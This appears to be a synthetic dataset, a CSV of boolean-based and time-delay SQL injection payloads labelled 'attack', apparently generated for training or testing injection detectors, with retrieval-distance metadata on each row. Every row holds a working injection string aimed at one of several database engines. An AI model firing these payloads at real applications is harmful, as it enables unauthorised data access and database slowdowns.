id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000024,attack,boolean,"1'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001379,5.411542019186509
CTGAN_000025,attack,boolean,1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- izad,nearest_attack_euclidean,R001133,4.257185497919133
CTGAN_000026,attack,boolean,"-3637"" or   (  8459  =  8459  )  *4906",nearest_attack_euclidean,R000433,5.188434500725751
CTGAN_000027,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R003537,7.326678966447249
CTGAN_000028,attack,boolean,"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'eflk'  =  'eflk",nearest_attack_euclidean,R001252,4.826485459247081
CTGAN_000029,attack,boolean,"1   )    )     )   and make_set  (  8882  =  1593,1593  )   and    (    (     (  7989  =  7989",nearest_attack_euclidean,R002906,7.52704319131429
CTGAN_000030,attack,boolean,"-3637"" or   (  8459  =  8459  )  *4906",nearest_attack_euclidean,R000433,5.264969709784161
CTGAN_000031,attack,boolean,"1'+  (  select wjpc where 5943  =  5943 and make_set  (  8403  =  8403,8899   )    )   +'",nearest_attack_euclidean,R003665,6.406152992071003
CTGAN_000032,attack,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'obax' like 'obax",nearest_attack_euclidean,R002332,6.099187881937587
CTGAN_000033,attack,boolean,"1   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R002872,5.094854016217735
CTGAN_000034,attack,boolean,1'+  (  select wgmn where 4368  =  4368 and 7859  =  6151  )  +',nearest_attack_euclidean,R000412,6.429182712084001
CTGAN_000035,attack,boolean,"1"" where 4366  =  4366 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R001604,5.505135755380724
CTGAN_000036,attack,boolean,"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'csmu'  =  'csmu",nearest_attack_euclidean,R003109,3.9411144375276534
CTGAN_000037,attack,boolean,-8370'   )    )    or   (  3501  =  6407  )  *6407 and    (    (   'agcm' like 'agcm,nearest_attack_euclidean,R001805,7.9698993059140975
CTGAN_000038,attack,boolean,"1'   )    )    as owcw where 1107  =  1107 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R002045,5.306312078236385
CTGAN_000039,attack,boolean,"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'xdui' like 'xdui",nearest_attack_euclidean,R000519,7.022357363271813
CTGAN_000040,attack,boolean,"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R002728,4.624409296849215
CTGAN_000041,attack,boolean,"-2131"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""wpsf"" like ""wpsf",nearest_attack_euclidean,R000634,8.702209274723012
CTGAN_000042,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R003525,5.252466596312358
CTGAN_000043,attack,boolean,select * from users where id  =  1 +$+. or 1  =  1 -- 1,nearest_attack_euclidean,R000043,7.9274870160584605
CTGAN_000044,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""vkqt""  =  ""vkqt",nearest_attack_euclidean,R001019,4.946676670138769
CTGAN_000045,attack,boolean,"1'||  (  select 'baur' from dual where 9384  =  9384 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002542,6.514758893648611
CTGAN_000046,attack,boolean,"1   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  6578  =  6578",nearest_attack_euclidean,R003560,6.014164709220916
CTGAN_000047,attack,boolean,1  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  3945  =  3945,nearest_attack_euclidean,R000337,4.165961721505455
CTGAN_000048,attack,boolean,1'  )   as yyyb where 1705  =  1705 and   (  8770  =  6988  )  *6988--,nearest_attack_euclidean,R000590,5.086508379888864
CTGAN_000049,attack,boolean,"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000577,4.554132199187384
CTGAN_000050,attack,boolean,"1""  )   as bllz where 6975  =  6975 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R003113,5.461775772837231
CTGAN_000051,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R003377,4.412299218105025
CTGAN_000052,attack,boolean,"1%"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """,nearest_attack_euclidean,R001046,7.634829822350095
CTGAN_000053,attack,boolean,"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",nearest_attack_euclidean,R002690,4.598621282376756
CTGAN_000054,attack,boolean,"1'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000572,5.517270178242972
CTGAN_000055,attack,boolean,"1'||  (  select 'ctgs' where 6809  =  6809 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R003584,5.3333896948798385
CTGAN_000056,attack,boolean,"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'bmsa'  =  'bmsa",nearest_attack_euclidean,R002659,4.980196154502497
CTGAN_000057,attack,boolean,-4082   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   7874  =  7874,nearest_attack_euclidean,R000378,8.125013104410883
CTGAN_000058,attack,boolean,-1375'   )    )     )   or   (  1226  =  9648  )  *9648 and    (    (     (  'kfoy' like 'kfoy,nearest_attack_euclidean,R001005,5.381676401685271
CTGAN_000059,attack,boolean,"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb",nearest_attack_euclidean,R000438,6.463209879387486
CTGAN_000060,attack,boolean,"1""   )    )    as pafp where 6770  =  6770 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R003168,6.94446395764942
CTGAN_000061,attack,boolean,"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""pmmr""  =  ""pmmr",nearest_attack_euclidean,R002537,7.952058465306196
CTGAN_000062,attack,boolean,"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",nearest_attack_euclidean,R002124,7.893370357665558
CTGAN_000063,attack,boolean,"1'   )    )    as jpxj where 6153  =  6153 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001667,7.863648930635014
CTGAN_000064,attack,boolean,"-4012""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""ccfn""  =  ""ccfn",nearest_attack_euclidean,R001415,4.345884321725051
CTGAN_000065,attack,boolean,1' rlike   (  select   (  case when   (  6855  =  1056  )   then 1 else 0x28 end   )    )    and 'pmrz' like 'pmrz,nearest_attack_euclidean,R002112,4.815230763307394
CTGAN_000066,attack,boolean,"-4945 or make_set  (  9354  =  9354,7185  )  ",nearest_attack_euclidean,R002032,5.527681685158832
CTGAN_000067,attack,boolean,"1'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'narn'  =  'narn",nearest_attack_euclidean,R003547,5.418499143025702
CTGAN_000068,attack,boolean,1   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   6406  =  6406,nearest_attack_euclidean,R000287,7.065689831383099
CTGAN_000069,attack,boolean,"1' in boolean mode  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002234,4.885508407024626
CTGAN_000070,attack,boolean,"1'  )   as kgnd where 1550  =  1550 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000773,5.893470876828805
CTGAN_000071,attack,boolean,-3982   )    )    or 6872  =  6872 and    (    (   6331  =  6331,nearest_attack_euclidean,R002882,6.5098336540516035
CTGAN_000072,attack,boolean,"1   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   4450  =  4450",nearest_attack_euclidean,R001371,4.782367179961552
CTGAN_000073,attack,boolean,1' and   (  3423  =  7789  )  *7789 and 'pdia' like 'pdia,nearest_attack_euclidean,R001647,5.145096769217783
CTGAN_000074,attack,boolean,1   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  2197  =  2197,nearest_attack_euclidean,R001495,5.294478192867186
CTGAN_000075,attack,boolean,1'+  (  select enzd where 6046  =  6046 and   (  3020  =  3020  )  *6703  )  +',nearest_attack_euclidean,R001310,6.6780249738712625
CTGAN_000076,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  1321  =  1321",nearest_attack_euclidean,R001798,5.684945080572936
CTGAN_000077,attack,boolean,"1' and make_set  (  8403  =  8403,8899  )  ",nearest_attack_euclidean,R001017,4.297031840136699
CTGAN_000078,attack,boolean,"1""   )    )    and 8329  =  5584#",nearest_attack_euclidean,R002337,7.320906808356332
CTGAN_000079,attack,boolean,"1""  )   and elt  (  6651  =  1172,1172  )   and   (  ""zfkb"" like ""zfkb",nearest_attack_euclidean,R001073,4.364611280134736
CTGAN_000080,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R000816,5.494313136136995
CTGAN_000081,attack,boolean,"1%""   )    )     )   rlike   (  select   (  case when   (  4442  =  4476  )   then 1 else 0x28 end   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R003440,7.0487088352711975
CTGAN_000082,attack,boolean,"1  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001816,6.854704651874942
CTGAN_000083,attack,boolean,1'  )   as dpmh where 5281  =  5281 and 2006  =  2006,nearest_attack_euclidean,R003510,3.884197404427298
CTGAN_000084,attack,boolean,"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'xdui' like 'xdui",nearest_attack_euclidean,R000519,7.408690280043934
CTGAN_000085,attack,boolean,"1' in boolean mode  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  #",nearest_attack_euclidean,R003556,7.097596521932348
CTGAN_000086,attack,boolean,"-9672'   )    )    as rupb where 8218  =  8218 or make_set  (  4954  =  1836,1836  )  --",nearest_attack_euclidean,R000728,6.7066342400494054
CTGAN_000087,attack,boolean,"1  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  5215  =  5215",nearest_attack_euclidean,R002085,4.8808941258453435
CTGAN_000088,attack,boolean,"1'||  (  select 'uusj' where 2149  =  2149 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",nearest_attack_euclidean,R001116,4.936000394430049
CTGAN_000089,attack,boolean,-2823'   )    )    or 5663  =  4228 and    (    (   'skgh' like 'skgh,nearest_attack_euclidean,R001882,4.111503496826292
CTGAN_000090,attack,boolean,"1""   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001231,4.825251060053807
CTGAN_000091,attack,boolean,"-2241   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  6840  =  6840",nearest_attack_euclidean,R001578,6.926230482069799
CTGAN_000092,attack,boolean,"-5840'  )   or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R003272,3.029970505645893
CTGAN_000093,attack,boolean,"1   )    )    as uizx where 2512  =  2512 and make_set  (  1402  =  2908,2908  )  --",nearest_attack_euclidean,R000805,5.211129968172415
CTGAN_000094,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""mjkl""  =  ""mjkl",nearest_attack_euclidean,R002740,4.614982849582313
CTGAN_000095,attack,boolean,"1'  )   where 8348  =  8348 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R002902,5.413495384467778
CTGAN_000096,attack,boolean,"-6599%""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000931,5.1189820934834405
CTGAN_000097,attack,boolean,"1""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""lxue"" like ""lxue",nearest_attack_euclidean,R000437,5.097652695997104
CTGAN_000098,attack,boolean,"-8094  )   or elt  (  1032  =  1032,3623  )   and   (  4569  =  4569",nearest_attack_euclidean,R003504,6.945518840878868
CTGAN_000099,attack,boolean,1'||  (  select 'pxkz' where 2207  =  2207 and   (  3020  =  3020  )  *6703  )  ||',nearest_attack_euclidean,R002837,5.919773189562264
CTGAN_000100,attack,boolean,"1'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001122,6.6686786293239075
CTGAN_000101,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ycuo"" like ""ycuo",nearest_attack_euclidean,R002342,5.1822526746750315
CTGAN_000102,attack,boolean,"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R001307,6.784699331555743
CTGAN_000103,attack,boolean,"-1863'  )   or make_set  (  9354  =  9354,7185  )   and   (  'whwv'  =  'whwv",nearest_attack_euclidean,R001913,6.35271697923966
CTGAN_000104,attack,boolean,"-7802'   )    )     )   or elt  (  8778  =  9974,9974  )   and    (    (     (  'glsq' like 'glsq",nearest_attack_euclidean,R002405,5.162318914003737
CTGAN_000105,attack,boolean,"1'   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'esma' like 'esma",nearest_attack_euclidean,R002008,5.305156488485328
CTGAN_000106,attack,boolean,"-9672'   )    )    as rupb where 8218  =  8218 or make_set  (  4954  =  1836,1836  )  --",nearest_attack_euclidean,R000728,5.464121666977541
CTGAN_000107,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R002119,4.249282213915995
CTGAN_000108,attack,boolean,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003077,4.641650884832824
CTGAN_000109,attack,boolean,"-4012""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""ccfn""  =  ""ccfn",nearest_attack_euclidean,R001415,5.717331509057548
CTGAN_000110,attack,boolean,"1   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   9333  =  9333",nearest_attack_euclidean,R001433,6.736839716561938
CTGAN_000111,attack,boolean,"1""   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""zzcd""  =  ""zzcd",nearest_attack_euclidean,R003396,4.63897876562005
CTGAN_000112,attack,boolean,"1%'   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R003170,6.070240278777453
CTGAN_000113,attack,boolean,"-7329""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""borw"" like ""borw",nearest_attack_euclidean,R001229,5.977850734760735
CTGAN_000114,attack,boolean,select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,nearest_attack_euclidean,R000178,4.798287756902046
CTGAN_000115,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000305,6.08511079673109
CTGAN_000116,attack,boolean,1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'gzpx'  =  'gzpx,nearest_attack_euclidean,R002407,3.881307314774234
CTGAN_000117,attack,boolean,"1'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'raus'  =  'raus",nearest_attack_euclidean,R001585,6.5496494453842855
CTGAN_000118,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'opyt'  =  'opyt",nearest_attack_euclidean,R002941,4.4679006875613005
CTGAN_000119,attack,boolean,"1   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  4744  =  4744",nearest_attack_euclidean,R001242,6.999326445071086
CTGAN_000120,attack,boolean,"1""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""eeye""  =  ""eeye",nearest_attack_euclidean,R002693,4.301827315601762
CTGAN_000121,attack,boolean,"1""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001851,4.764625798171273
CTGAN_000122,attack,boolean,1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'vtoi' like 'vtoi,nearest_attack_euclidean,R002212,5.425349926038515
CTGAN_000123,attack,boolean,"-1863'  )   or make_set  (  9354  =  9354,7185  )   and   (  'whwv'  =  'whwv",nearest_attack_euclidean,R001913,4.476144636927591
CTGAN_000124,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R001128,6.273212974109602
CTGAN_000125,attack,boolean,1'  )   and 4822  =  6997 and   (  'ojku'  =  'ojku,nearest_attack_euclidean,R002939,4.079733801956722
CTGAN_000126,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R003537,5.799300055682412
CTGAN_000127,attack,boolean,"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""xopd""  =  ""xopd",nearest_attack_euclidean,R001753,6.438657484862297
CTGAN_000128,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001830,6.293353637949526
CTGAN_000129,attack,boolean,"1%'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R002814,5.839192918829089
CTGAN_000130,attack,boolean,"1'+  (  select wjpc where 5943  =  5943 and make_set  (  8403  =  8403,8899   )    )   +'",nearest_attack_euclidean,R003665,6.210200533130035
CTGAN_000131,attack,boolean,"1""   )    )    as qhnb where 8302  =  8302 and   (  3020  =  3020  )  *6703--",nearest_attack_euclidean,R001052,4.196791741038894
CTGAN_000132,attack,boolean,"-1763""  )   or elt  (  1032  =  1032,3623  )   and   (  ""nqvv""  =  ""nqvv",nearest_attack_euclidean,R001701,4.159221854717372
CTGAN_000133,attack,boolean,"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm",nearest_attack_euclidean,R000875,5.165705791161166
CTGAN_000134,attack,boolean,"1""  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R003143,5.84222118737632
CTGAN_000135,attack,boolean,1   )    )    and 3249  =  2985,nearest_attack_euclidean,R001285,5.479553874199077
